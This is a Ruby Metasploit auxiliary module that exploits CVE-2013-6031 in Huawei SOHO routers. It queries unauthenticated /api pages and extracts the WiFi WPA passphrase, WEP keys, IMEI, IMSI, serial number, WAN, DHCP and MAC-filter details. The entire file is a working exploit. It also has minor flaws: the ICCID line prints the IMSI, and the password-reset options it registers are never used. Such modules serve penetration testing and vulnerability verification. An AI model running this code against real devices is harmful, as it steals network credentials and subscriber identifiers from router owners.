##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'base64'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name' => "Huawei Datacard, CSRF Information Disclosure 
Vulnerability",
      'Description' => %q{
This module exploits an un-authenticated information disclosure 
vulnerability in Huawei
SOHO routers. It will gather information by accessing the /api pages 
where
authentication is not required, thus allowing configuration changes
as well as information disclosure including any stored SMS.
},
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Jimson K James.',
'tomsmaily [at] aczire.com', #Msf module
        ],
      'References' =>
        [
          [ 'CVE', '2013-6031' ],
      # [ 'OSVDB', '6031' ],
      # [ 'BID', '6031' ],
      # [ 'URL', 'http://seclists.org/bugtraq/2013/Nov/6031' ],
        ],
      'DisclosureDate' => "Nov 11 2013" ))

      register_options(
        [
          OptString.new('PASSWORD', [ true, 'The password to reset to', 
'admin']),
OptBool.new('GAP', [false, 'Attempt admin password reset using wifi 
password.', false]),
        ], self.class)
  end

def run

#Gather basic router information
get_router_info
print_status("")
get_router_mac_filter_info
print_status("")
get_router_wan_info
print_status("")
get_router_dhcp_info
print_status("")

print_status("Now trying to get WiFi Key details...")
    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/wlan/security-settings',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (!(res.code == 200))
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    print_status("---===[ WiFi Key Details ]===---")

wifissid = get_router_ssid
if wifissid
print_status("WiFi SSID: #{wifissid}")
end

    # Grabbing the wifiwpapsk
    if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
      wifiwpapsk = $1
      print_status("Wifi WPA PSK: #{wifiwpapsk}")
    end

    # Grabbing the WifiAuthmode
    if res.body.match(/<WifiAuthmode>(.*)<\/WifiAuthmode>/i)
      wifiauthmode = $1
      print_status("Wifi Auth mode: #{wifiauthmode}")
    end

    # Grabbing the WifiBasicencryptionmodes
    if 
res.body.match(/<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i)
      wifibasicencryptionmodes = $1
      print_status("Wifi Basic encryption modes: 
#{wifibasicencryptionmodes}")
    end

    # Grabbing the WifiWpaencryptionmodes
    if 
res.body.match(/<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i)
      wifiwpaencryptionmodes = $1
      print_status("Wifi WPA Encryption Modes: 
#{wifiwpaencryptionmodes}")
    end

    # Grabbing the WifiWepKey1
    if res.body.match(/<WifiWepKey1>(.*)<\/WifiWepKey1>/i)
      wifiWepKey1 = $1
      print_status("Wifi WEP Key1: #{wifiWepKey1}")
    end

    # Grabbing the WifiWepKey2
    if res.body.match(/<WifiWepKey2>(.*)<\/WifiWepKey2>/i)
      wifiWepKey2 = $1
      print_status("Wifi WEP Key2: #{wifiWepKey2}")
    end

    # Grabbing the WifiWepKey3
    if res.body.match(/<WifiWepKey3>(.*)<\/WifiWepKey3>/i)
      wifiWepKey3 = $1
      print_status("Wifi WEP Key3: #{wifiWepKey3}")
    end

    # Grabbing the WifiWepKey4
    if res.body.match(/<WifiWepKey4>(.*)<\/WifiWepKey4>/i)
      wifiWepKey4 = $1
      print_status("Wifi WEP Key4: #{wifiWepKey4}")
    end

    # Grabbing the WifiWepKeyIndex
    if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
      wifiWepKeyIndex = $1
      print_status("Wifi WEP Key Index: #{wifiWepKeyIndex}")
    end

   rescue::Exception => e
print_status("Ooooops: #{e.class} #{e}")
   
   #end run
  end

def get_router_info

    print_status("Attempting to connect to #{rhost} to gather basic 
device information...")
    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/device/information',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (res.code == 200)
      print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server 
header")
    else
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (res.headers['Server'].match(/IPWEBS\/1.4.0/i))
      print_status("Server is a Huawei router! Grabbing info\n")
    else
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    print_status("---===[ Basic Information ]===---")

    # Grabbing the DeviceName
    if res.body.match(/<DeviceName>(.*)<\/DeviceName>/i)
      deviceName = $1
      print_status("Device Name: #{deviceName}")
    end

    # Grabbing the SerialNumber
    if res.body.match(/<SerialNumber>(.*)<\/SerialNumber>/i)
      serialNumber = $1
      print_status("Serial Number: #{serialNumber}")
    end

    # Grabbing the IMEI
    if res.body.match(/<Imei>(.*)<\/Imei>/i)
      imei = $1
      print_status("IMEI: #{imei}")
    end

    # Grabbing the IMSI
    if res.body.match(/<Imsi>(.*)<\/Imsi>/i)
      imsi = $1
      print_status("IMSI: #{imsi}")
    end

    # Grabbing the ICCID
    if res.body.match(/<Iccid>(.*)<\/Iccid>/i)
      iccid = $1
      print_status("ICCID: #{imsi}")
    end

    # Grabbing the HardwareVersion
    if res.body.match(/<HardwareVersion>(.*)<\/HardwareVersion>/i)
      hardwareVersion = $1
      print_status("Hardware Version: #{hardwareVersion}")
    end

    # Grabbing the SoftwareVersion
    if res.body.match(/<SoftwareVersion>(.*)<\/SoftwareVersion>/i)
      softwareVersion = $1
      print_status("Software Version: #{softwareVersion}")
    end

    # Grabbing the WebUIVersion
    if res.body.match(/<WebUIVersion>(.*)<\/WebUIVersion>/i)
      webUIVersion = $1
      print_status("WebUI Version: #{webUIVersion}")
    end

    # Grabbing the MacAddress1
    if res.body.match(/<MacAddress1>(.*)<\/MacAddress1>/i)
      macAddress1 = $1
      print_status("Mac Address1: #{macAddress1}")
    end

    # Grabbing the MacAddress2
    if res.body.match(/<MacAddress2>(.*)<\/MacAddress2>/i)
      macAddress2 = $1
      print_status("Mac Address2: #{macAddress2}")
    end

    # Grabbing the ProductFamily
    if res.body.match(/<ProductFamily>(.*)<\/ProductFamily>/i)
      productFamily = $1
      print_status("Product Family: #{productFamily}")
    end

    # Grabbing the Classification
    if res.body.match(/<Classify>(.*)<\/Classify>/i)
      classify = $1
      print_status("Classification: #{classify}")
    end
  end

def get_router_ssid

    #print_status("Attempting to connect to 
http://#{rhost}/api/device/information to get router ssid")
    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/wlan/basic-settings',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (!(res.code == 200))
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    # Grabbing the Wifi SSID
    if res.body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
      ssid = $1
#print_status("SSID #{ssid}")
return $1
    end
end
  
def get_router_mac_filter_info

    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/wlan/mac-filter',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (!(res.code == 200))
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    print_status("---===[ MAC Filter Information ]===---")

    # Grabbing the WifiMacFilterStatus
    if 
res.body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
      wifiMacFilterStatus = $1
print_status("Wifi MAC Filter Status: #{(wifiMacFilterStatus == "1") ? 
"ENABLED" : "DISABLED"}" )
    end

    # Grabbing the WifiMacFilterMac0
    if res.body.match(/<WifiMacFilterMac0>(.*)<\/WifiMacFilterMac0>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac1
    if res.body.match(/<WifiMacFilterMac1>(.*)<\/WifiMacFilterMac1>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac2
    if res.body.match(/<WifiMacFilterMac2>(.*)<\/WifiMacFilterMac2>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac3
    if res.body.match(/<WifiMacFilterMac3>(.*)<\/WifiMacFilterMac3>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac4
    if res.body.match(/<WifiMacFilterMac4>(.*)<\/WifiMacFilterMac4>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac5
    if res.body.match(/<WifiMacFilterMac5>(.*)<\/WifiMacFilterMac5>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac6
    if res.body.match(/<WifiMacFilterMac6>(.*)<\/WifiMacFilterMac6>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac7
    if res.body.match(/<WifiMacFilterMac7>(.*)<\/WifiMacFilterMac7>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac8
    if res.body.match(/<WifiMacFilterMac8>(.*)<\/WifiMacFilterMac8>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
    # Grabbing the WifiMacFilterMac9
    if res.body.match(/<WifiMacFilterMac9>(.*)<\/WifiMacFilterMac9>/i)
      wifiMacFilterMac = $1
if !(wifiMacFilterMac == "")
print_status("Mac: #{wifiMacFilterMac}")
end
    end
  end
  
def get_router_wan_info

    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/monitoring/status',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (!(res.code == 200))
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    print_status("---===[ WAN Details ]===---")

    # Grabbing the WanIPAddress
    if res.body.match(/<WanIPAddress>(.*)<\/WanIPAddress>/i)
      wanIPAddress = $1
      print_status("Wan IP Address: #{wanIPAddress}")
    end

    # Grabbing the PrimaryDns
    if res.body.match(/<PrimaryDns>(.*)<\/PrimaryDns>/i)
      primaryDns = $1
      print_status("Primary Dns: #{primaryDns}")
    end

    # Grabbing the SecondaryDns
    if res.body.match(/<SecondaryDns>(.*)<\/SecondaryDns>/i)
      secondaryDns = $1
      print_status("Secondary Dns: #{secondaryDns}")
    end

  end
 
def get_router_dhcp_info

    res = send_request_raw(
    {
      'method' => 'GET',
      'uri' => '/api/dhcp/settings',
    }, 25)

    #check whether we got any response from server and proceed.
    if not res
      print_error("Failed to get any response from server!!!")
      return
    end

    #Is it a HTTP OK
    if (!(res.code == 200))
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a Huawei router
    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
      print_error("Target doesn't seem to be a Huawei router. Exiting!")
      return
    end

    print_status("---===[ DHCP Details ]===---")

    # Grabbing the DhcpIPAddress
    if res.body.match(/<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i)
      dhcpIPAddress = $1
      print_status("LAN IP Address: #{dhcpIPAddress}")
    end

    # Grabbing the DhcpStatus
    if res.body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
      dhcpStatus = $1
      print_status("DHCP: #{(dhcpStatus=="1") ? "ENABLED" : 
"DISABLED"}")
    end

if (dhcpStatus != "1")
return
end
    
# Grabbing the DhcpStartIPAddress
    if res.body.match(/<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i)
      dhcpStartIPAddress = $1
      print_status("DHCP StartIPAddress: #{dhcpStartIPAddress}")
    end

    # Grabbing the DhcpEndIPAddress
    if res.body.match(/<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i)
      dhcpEndIPAddress = $1
      print_status("DHCP EndIPAddress: #{dhcpEndIPAddress}")
    end

    # Grabbing the DhcpLeaseTime
    if res.body.match(/<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i)
      dhcpLeaseTime = $1
      print_status("DHCP Lease Time: #{dhcpLeaseTime}")
    end
  end

#end module
end
